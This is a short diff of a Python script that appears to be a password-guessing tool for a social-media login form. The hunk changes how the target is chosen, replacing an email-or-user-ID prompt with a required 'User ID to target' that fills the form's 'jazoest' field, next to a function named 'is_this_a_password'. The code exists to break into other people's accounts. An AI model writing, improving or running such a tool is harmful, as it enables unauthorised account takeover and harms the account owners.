@@ -25,12 +25,8 @@ def create_form():
     form = {
         'lsd': soup.form.input['value'],
     }
-    email = input('Enter Email/Username to target: ').strip()
-    user_id = input('Enter User ID to target (leave empty if not needed): ').strip()
-    if user_id:
-        form['jazoest'] = f'{user_id}_'
-    else:
-        form['email'] = email
+    user_id = input('Enter User ID to target: ').strip()
+    form['jazoest'] = f'{user_id}_'
     return form, session
 
 def is_this_a_password(index, password, form, session):
